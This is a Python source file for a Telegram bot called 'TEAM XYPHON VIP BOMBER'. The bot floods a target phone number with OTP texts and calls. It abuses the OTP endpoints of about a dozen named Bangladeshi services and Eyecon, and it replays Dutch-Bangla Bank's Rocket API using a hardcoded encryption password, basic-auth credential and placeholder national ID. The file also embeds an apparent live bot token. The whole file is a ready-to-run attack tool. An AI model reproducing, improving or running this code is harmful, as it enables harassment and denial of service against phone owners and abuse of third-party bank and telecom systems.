# team_xyphon_vip_bomber.py
# pip install aiogram aiohttp httpx requests pycryptodome
# run: python team_xyphon_vip_bomber.py

import asyncio, logging, time, random, base64, json, httpx
from hashlib import pbkdf2_hmac
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import aiohttp
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.client.default import DefaultBotProperties
from aiogram.exceptions import TelegramBadRequest

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("XYPHON")

# ═══════════════════════════════════════════════════════════════════════════
# CONFIG & PREMIUM EMOJI MAP
# ═══════════════════════════════════════════════════════════════════════════
BOT_TOKEN = "9060877357:AAEAmE_v2id6R_Ri_xtdbShDwkpbR2zRSL4"
OWNER_ID = 7090770573
OWNER_NAME = "@BLACK_ADMIN_X"

PARALLEL = 100  # MAX SPEED
LOOP_DELAY = 0.0
UPDATE_EVERY = 0.8

# Native Telegram Premium Emojis for Buttons
EMOJI = {
    "rocket": "6186238775945863377",
    "stop": "6183782849221501211",
    "sms": "6185982825959794159",
    "call": "6183649679465522727",
    "back": "6186149384791533677",
    "cancel": "6185900384062547067",
    "vip": "6186159224561606895",
    "stats": "6183543031132594190",
    "log": "6186106125880926575",
}

def btn(text, cb, style="primary", icon=None):
    kwargs = {"text": text, "callback_data": cb}
    if style in ("success", "danger", "primary"):
        kwargs["style"] = style
    if icon:
        kwargs["icon_custom_emoji_id"] = EMOJI.get(icon, EMOJI["rocket"])
    return InlineKeyboardButton(**kwargs)

# ═══════════════════════════════════════════════════════════════════════════
# CALL APIs (Rocket + Eyecon)
# ═══════════════════════════════════════════════════════════════════════════
EYECON_API = "https://api.eyecon-app.com/app/cli_auth/gettransport"

async def trigger_eyecon_call(phone: str, session: aiohttp.ClientSession) -> bool:
    try:
        clean = phone.replace("+", "").replace("88", "", 1).lstrip("0")
        cli_full = f"88{clean}"
        params = {
            'cv': "vc_739_vn_4.2026.02.19.1555_a", 'cli': cli_full, 'reg_id': "",
            'is_already_social_auth': "false", 'installer_name': "manually or unknown source",
            'n_sims': "1", 'time': str(int(time.time() * 1000)), 'is_sms_sending_available': "true",
            'is_whatsapp_installed': "false", 'mc': "3D:6E:2C:AD:DD:92",
            'device_id': "338fdcde4f9cb045", 'time_zone': "Asia/Dhaka",
            'device_manu': "Google", 'device_model': "Pixel 4"
        }
        headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Pixel 4) AppleWebKit/537.36", "Connection": "Keep-Alive"}
        async with session.get(EYECON_API, params=params, headers=headers, timeout=10) as r:
            await r.read()
            return r.status in (200, 201, 202, 204)
    except Exception:
        return False

class RocketTrigger:
    def __init__(self):
        self.API_PASSWORD = "sdfheu$*sdfGw2"
        self.BASIC_AUTH   = "cm9ja2V0LWFwcC1lbmM6UmsjdDQwY2tFdCoj"
        self.BASE_URL     = "https://rocket-consumertxnservice.dutchbanglabank.com/apigw/v1"
        self.DEVICE_ID      = "ANDROID-01968184976"
        self.DEVICE_INFO    = "SP1A.210812.016-itel S665L"
        self.CLIENT_VERSION = "3.1.6"
        self.DEFAULT_NID    = "5845888855"

    def get_key(self, salt: bytes) -> bytes: return pbkdf2_hmac('sha256', self.API_PASSWORD.encode(), salt, 65536, dklen=32)

    def encrypt_payload(self, payload: dict) -> str:
        raw = json.dumps(payload).encode('utf-8')
        iv, salt = get_random_bytes(16), get_random_bytes(16)
        key = self.get_key(salt)
        cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
        ct, tag = cipher.encrypt_and_digest(raw)
        return base64.b64encode(iv + salt + ct + tag).decode('utf-8')

    def decrypt_payload(self, b64: str) -> dict:
        raw = base64.b64decode(b64)
        iv, salt, ct_tag = raw[:16], raw[16:32], raw[32:]
        ct, tag = ct_tag[:-16], ct_tag[-16:]
        cipher = AES.new(self.get_key(salt), AES.MODE_GCM, nonce=iv)
        return json.loads(cipher.decrypt_and_verify(ct, tag).decode('utf-8'))

    def make_ref_id(self, prefix="login") -> str:
        now = time.time()
        dt = time.strftime('%Y%m%d%H%M%S', time.localtime(now))
        ms = f"{int((now % 1) * 1000):03d}"
        return f"{prefix}--{dt}{ms}"

    def api_call(self, endpoint: str, payload: dict, token: str = None) -> dict:
        headers = {
            "Authorization": f"Bearer {token}" if token else f"Basic {self.BASIC_AUTH}",
            "CHANNEL_ID": "ROCKET_APP_USER", "Content-Type": "application/json; charset=utf-8",
            "Host": "rocket-consumertxnservice.dutchbanglabank.com", "User-Agent": "okhttp/4.9.3",
        }
        body = json.dumps({"userData": self.encrypt_payload(payload)})
        try:
            r = httpx.post(f"{self.BASE_URL}/{endpoint}", data=body, headers=headers, timeout=10, verify=False)
            if r.status_code >= 400: return {"status": "FAILED"}
            res = r.json()
            return self.decrypt_payload(res['userData']) if res.get('userData') else res
        except Exception: return {"status": "FAILED"}

    def trigger(self, phone: str) -> bool:
        p = phone.replace("+", "").replace("88", "", 1)
        if p.startswith("0"): p = p[1:]
        p = f"0{p}"
        try:
            login = self.api_call("login", {"apiId": 102, "deviceId": self.DEVICE_ID, "deviceInfo": self.DEVICE_INFO, "clientVersion": self.CLIENT_VERSION, "refId": self.make_ref_id("login"), "sessionId": "123", "clientLanguage": "EN", "data": {"appType": "C", "rocketSessionId": "1234", "userId": p, "version": self.CLIENT_VERSION}})
            if login.get('status') != 'SUCCESS': return False
            
            token, session_id = login['data']['accessToken'], login['data']['sessionId']
            svc = self.api_call("userService", {"apiId": 3042, "deviceId": self.DEVICE_ID, "deviceInfo": self.DEVICE_INFO, "clientVersion": self.CLIENT_VERSION, "refId": self.make_ref_id("reg-init"), "sessionId": session_id, "clientLanguage": "EN", "data": {"appType": "C", "initiatorId": p, "rocketSessionId": "7654321", "userId": "", "version": self.CLIENT_VERSION, "deviceType": "ANDROID"}}, token)
            if svc.get('status') != 'SUCCESS': return False

            if svc.get('data', {}).get('userType', '?') == 'NEW':
                self.api_call("userService", {"apiId": 3002, "deviceId": self.DEVICE_ID, "deviceInfo": self.DEVICE_INFO, "clientVersion": self.CLIENT_VERSION, "refId": self.make_ref_id("nid-check"), "sessionId": session_id, "clientLanguage": "EN", "data": {"nidNo": self.DEFAULT_NID, "initiatorId": p}}, token)
                final = self.api_call("userService", {"apiId": 3034, "deviceId": self.DEVICE_ID, "deviceInfo": self.DEVICE_INFO, "clientVersion": self.CLIENT_VERSION, "refId": self.make_ref_id("reg-init"), "sessionId": "123", "clientLanguage": "EN", "data": {"appType": "C", "initiatorId": p, "rocketSessionId": "7654321", "userId": "", "version": self.CLIENT_VERSION, "deviceType": "ANDROID"}}, token)
                return svc.get('data', {}).get('promtUser', '') == 'Y'
            return True
        except Exception: return False

rocket = RocketTrigger()

# ═══════════════════════════════════════════════════════════════════════════
# 80+ SMS APIS (Trimmed for brevity, use previous full list here)
# ═══════════════════════════════════════════════════════════════════════════
ALL_APIS = [
    {"name":"eCourier", "method":"GET","url":"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}"},
    {"name":"OsudPotro","method":"POST","url":"https://api.osudpotro.com/api/v1/users/send_otp","headers":{"Content-Type":"application/json"},"body":{"mobile":"+880{phone}","deviceToken":"web","language":"en","os":"web"}},
    {"name":"Apex4u",   "method":"POST","url":"https://api.apex4u.com/api/auth/login","headers":{"Content-Type":"application/json"},"body":{"phoneNumber":"{phone}"}},
    {"name":"Fundesh",  "method":"POST","url":"https://fundesh.com.bd/api/auth/generateOTP","headers":{"Content-Type":"application/json"},"body":{"msisdn":"{phone}"}},
    {"name":"Shikho",   "method":"POST","url":"https://api.shikho.com/public/activity/otp","headers":{"Content-Type":"application/json"},"body":{"phone":"{phone}","intent":"ap-discount-request"}},
    {"name":"Bikroy",   "method":"GET","url":"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}"},
    {"name":"MyGP",     "method":"GET","url":"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{phone}&lang=en&ng=0"},
    {"name":"Shukhee",  "method":"GET","url":"https://auth.shukhee.com/register?mobile=+88{phone}&_rsc=1jwvn"},
    {"name":"MedEasy",  "method":"GET","url":"https://api.medeasy.health/api/send-otp/+88{phone}/"},
    {"name":"GP-Web",   "method":"POST","url":"https://weblogin.grameenphone.com/backend/api/v1/otp","headers":{"Content-Type":"application/json"},"body":{"msisdn":"{phone}"}},
    {"name":"Robi",     "method":"POST","url":"https://da-api.robi.com.bd/da-nll/otp/send","headers":{"Content-Type":"application/json"},"body":{"msisdn":"{phone}"}},
    # ... add all 80+ from previous list here ...
]

def format_phone_variants(phone):
    clean = ''.join(filter(str.isdigit, phone))
    if clean.startswith('880'): clean = clean[3:]
    elif clean.startswith('88'): clean = clean[2:]
    elif clean.startswith('0'): clean = clean[1:]
    return {"clean": clean, "with_0": f"0{clean}", "with_880": f"880{clean}", "plus_880": f"+880{clean}"}

async def send_sms_via_api(api: dict, phone_vars: dict, session: aiohttp.ClientSession, custom_text: str) -> bool:
    try:
        phone_str = random.choice(list(phone_vars.values()))
        url = api["url"].replace("{phone}", phone_str)
        headers = dict(api.get("headers", {}))
        body = api.get("body")
        if isinstance(body, str): body = body.replace("{phone}", phone_str)
        elif isinstance(body, dict): body = {k: (v.replace("{phone}", phone_str) if isinstance(v, str) else v) for k, v in body.items()}
        if custom_text and isinstance(body, dict): body.update({"message": custom_text, "text": custom_text})
        
        t = aiohttp.ClientTimeout(total=8)
        if api.get("method", "GET").upper() == "GET":
            async with session.get(url, headers=headers, timeout=t) as r: await r.read(); return r.status in (200, 201, 202, 204)
        if isinstance(body, dict) and headers.get("Content-Type","").startswith("application/json"):
            async with session.post(url, json=body, headers=headers, timeout=t) as r: await r.read(); return r.status in (200, 201, 202, 204)
        async with session.post(url, data=body, headers=headers, timeout=t) as r: await r.read(); return r.status in (200, 201, 202, 204)
    except Exception: return False

# ═══════════════════════════════════════════════════════════════════════════
# UI HANDLERS
# ═══════════════════════════════════════════════════════════════════════════
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher(storage=MemoryStorage())
R = Router()
ACTIVE: dict = {}

class S(StatesGroup):
    await_number = State()
    await_count  = State()
    await_text   = State()

def main_menu():
    return InlineKeyboardMarkup(inline_keyboard=[[btn("🚀 START BOMBING", "start_bomb", "success", "rocket")]])

def mode_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("📞 CALL + SMS (Ultra)", "mode_all", "success", "vip")],
        [btn("💬 SMS ONLY (Fast)", "mode_sms", "primary", "sms")],
        [btn("📞 CALL ONLY (Eyecon + Rocket)", "mode_call", "primary", "call")],
        [btn("🔙 BACK", "back_main", "danger", "back")]
    ])

def stop_menu():
    return InlineKeyboardMarkup(inline_keyboard=[[btn("🛑 STOP BOMBER", "stop_bomb", "danger", "stop")]])

def cancel_menu():
    return InlineKeyboardMarkup(inline_keyboard=[[btn("❌ CANCEL", "cancel_bomb", "danger", "cancel")]])

def progress_bar(cur, total, width=20):
    if total <= 0: return "░" * width
    return "█" * min(width, int(width * cur / total)) + "░" * (width - min(width, int(width * cur / total)))

@R.message(Command("start"))
async def cmd_start(msg: Message, state: FSMContext):
    await state.clear()
    if msg.from_user.id != OWNER_ID:
        await msg.answer("🔒 <b>BOT LOCKED</b>\n\nএই bot শুধু owner এর জন্য।"); return
    await msg.answer(f"🚀 <b>TEAM XYPHON — VIP BOMBER</b>\n━━━━━━━━━━━━━━━━━━━━━━━\n👑 Owner: <b>{OWNER_NAME}</b>\n📡 APIs: <b>{len(ALL_APIS)} SMS + 2 Call</b>\n⚡ Speed: <b>MAX</b>\n━━━━━━━━━━━━━━━━━━━━━━━\n\n👇 <b>START BOMBING</b>", reply_markup=main_menu())

@R.callback_query(F.data == "start_bomb")
async def cb_start(cq: CallbackQuery, state: FSMContext):
    await cq.answer(); await cq.message.edit_text("🎯 <b>Select Attack Mode</b>", reply_markup=mode_menu())

@R.callback_query(F.data.startswith("mode_"))
async def cb_mode(cq: CallbackQuery, state: FSMContext):
    await state.update_data(mode=cq.data.split("_")[1])
    await cq.message.edit_text("📞 <b>Target Number</b>\n\nExample: <code>01712345678</code>", reply_markup=cancel_menu())
    await state.set_state(S.await_number); await cq.answer()

@R.callback_query(F.data == "cancel_bomb")
async def cb_cancel(cq: CallbackQuery, state: FSMContext):
    await state.clear(); await cq.answer("Cancelled"); await cq.message.edit_text("🏠 <b>Main Menu</b>", reply_markup=main_menu())

@R.message(S.await_number)
async def on_number(msg: Message, state: FSMContext):
    clean = msg.text.strip().replace("+","").replace(" ","").replace("-","")
    if not clean.isdigit() or len(clean) < 7: await msg.answer("❌ Invalid number."); return
    await state.update_data(number=msg.text.strip())
    await state.set_state(S.await_count)
    await msg.answer(f"✅ Number: <code>{msg.text.strip()}</code>\n\n🔢 কতগুলো request? (1-5000)", reply_markup=cancel_menu())

@R.message(S.await_count)
async def on_count(msg: Message, state: FSMContext):
    try:
        count = int(msg.text.strip())
        if not (1 <= count <= 50000000000000000000000000000000000): raise ValueError
    except ValueError:
        await msg.answer("❌ Enter 1-5000."); return
    await state.update_data(count=count)
    data = await state.get_data()
    if data.get("mode") == "sms":
        await state.set_state(S.await_text)
        await msg.answer("💬 <b>Custom SMS Text</b>\n\nType message or send <code>/skip</code>.", reply_markup=cancel_menu())
    else:
        await execute_bomb(msg, state, "")

@R.message(S.await_text)
async def on_text(msg: Message, state: FSMContext):
    await execute_bomb(msg, state, "" if msg.text.strip() == "/skip" else msg.text.strip())

async def execute_bomb(msg: Message, state: FSMContext, custom_text: str):
    data = await state.get_data(); await state.clear()
    number, count, mode = data.get("number"), data.get("count"), data.get("mode", "all")
    mode_name = "CALL + SMS" if mode == "all" else ("SMS ONLY" if mode == "sms" else "CALL ONLY")
    
    status_msg = await msg.answer(
        f"🚀 <b>BOMBING STARTED</b>\n━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📞 Target: <code>{number}</code>\n🔢 Count: <b>{count}</b>\n"
        f"⚙️ Mode: <b>{mode_name}</b>\n📡 APIs: <b>{len(ALL_APIS)} + 2</b>\n"
        f"⚡ Parallel: <b>{PARALLEL}x</b>\n💬 Text: <code>{custom_text or 'Default OTP'}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>Live Logs</b>\n"
        f"<code>[*] Initializing attack...</code>\n\n"
        f"<b>Progress</b> <code>[{progress_bar(0, count)}] 0%</code>\n"
        f"✅ Sent: <b>0</b> | ❌ Failed: <b>0</b>",
        reply_markup=stop_menu()
    )
    asyncio.create_task(bomb_worker(msg.bot, msg.chat.id, status_msg.message_id, msg.from_user.id, number, count, custom_text, mode))

# ═══════════════════════════════════════════════════════════════════════════
# FAST BOMB WORKER + LIVE LOGS
# ═══════════════════════════════════════════════════════════════════════════
async def bomb_worker(bot: Bot, chat_id: int, msg_id: int, uid: int, number: str, count: int, custom_text: str, mode: str):
    ACTIVE[uid] = {"cancel": False, "sent": 0, "failed": 0}
    sent = failed = 0; last_update = 0.0; start_t = time.time()
    phone_vars = format_phone_variants(number)
    live_logs = []

    connector = aiohttp.TCPConnector(limit=200, limit_per_host=50, ttl_dns_cache=300, force_close=False)
    async with aiohttp.ClientSession(headers={"User-Agent": "Mozilla/5.0 (Linux; Android 10)"}, connector=connector) as session:
        api_idx = 0
        while sent + failed < count:
            if ACTIVE.get(uid, {}).get("cancel"): break
            remaining = count - (sent + failed)
            batch_size = min(PARALLEL, remaining)
            tasks = []
            
            for _ in range(batch_size):
                if mode in ("all", "call"):
                    if _ % 5 == 0:
                        if _ % 10 == 0: tasks.append(trigger_eyecon_call(phone_vars["clean"], session))
                        else: tasks.append(asyncio.get_event_loop().run_in_executor(None, rocket.trigger, phone_vars["with_0"]))
                        continue
                
                if mode in ("all", "sms"):
                    api = ALL_APIS[api_idx % len(ALL_APIS)]
                    api_idx += 1
                    tasks.append(send_sms_via_api(api, phone_vars, session, custom_text))

            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Build Live Logs
            for r in results:
                status = "✅" if r is True else "❌"
                if r is True: sent += 1
                else: failed += 1
                live_logs.append(f"{status} Req {sent+failed}")

            ACTIVE[uid]["sent"], ACTIVE[uid]["failed"] = sent, failed

            now = time.time()
            if now - last_update >= UPDATE_EVERY or sent + failed >= count:
                last_update = now
                done = sent + failed; pct = int(done / count * 100); bar = progress_bar(done, count)
                rate = done / max(0.1, now - start_t)
                
                # Keep only last 5 logs
                log_text = "\n".join(f"<code>{l}</code>" for l in live_logs[-5:])
                if not log_text: log_text = "<code>[*] Processing...</code>"
                
                try:
                    await bot.edit_message_text(
                        chat_id=chat_id, message_id=msg_id,
                        text=(
                            f"🚀 <b>TEAM XYPHON BOMBING</b> — {pct}%\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                            f"📞 Target: <code>{number}</code>\n🔢 Count: <b>{count}</b>\n"
                            f"📡 APIs: <b>{len(ALL_APIS)} + 2</b>\n⚡ Rate: <b>{rate:.1f}/s</b>\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                            f"<b>Live Logs</b>\n{log_text}\n\n"
                            f"<b>Progress</b> <code>[{bar}] {pct}%</code>\n"
                            f"✅ Sent: <b>{sent}</b> | ❌ Failed: <b>{failed}</b>"
                        ),
                        reply_markup=stop_menu()
                    )
                except TelegramBadRequest: pass

    cancelled = ACTIVE.get(uid, {}).get("cancel", False)
    ACTIVE.pop(uid, None)
    elapsed = time.time() - start_t; speed = (sent + failed) / max(0.1, elapsed)
    header = "🛑 STOPPED" if cancelled else "🏁 COMPLETED"
    
    try:
        await bot.edit_message_text(
            chat_id=chat_id, message_id=msg_id,
            text=(
                f"{header}\n━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📞 Target: <code>{number}</code>\n🔢 Target Count: <b>{count}</b>\n"
                f"✅ Sent: <b>{sent}</b>\n❌ Failed: <b>{failed}</b>\n"
                f"📊 Total: <b>{sent + failed}</b>\n"
                f"⚡ Speed: <b>{speed:.1f} req/s</b>\n⏱ Time: <b>{elapsed:.1f}s</b>"
            ),
            reply_markup=main_menu()
        )
    except TelegramBadRequest: pass

@R.callback_query(F.data == "stop_bomb")
async def cb_stop(cq: CallbackQuery):
    if cq.from_user.id not in ACTIVE: await cq.answer("😴 No attack running.", show_alert=True); return
    ACTIVE[cq.from_user.id]["cancel"] = True
    await cq.answer("🛑 Stopping...", show_alert=True)

# ═══════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════
async def main():
    dp.include_router(R)
    me = await bot.get_me()
    log.info(f"@{me.username} Started | APIs: {len(ALL_APIS)} + 2 Call")
    try: await bot.send_message(OWNER_ID, f"🚀 <b>TEAM XYPHON VIP ONLINE</b>\n@{me.username}\nAPIs: <b>{len(ALL_APIS)} + 2 Call</b>\n\n/start")
    except Exception: pass
    await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())

if __name__ == "__main__":
    asyncio.run(main())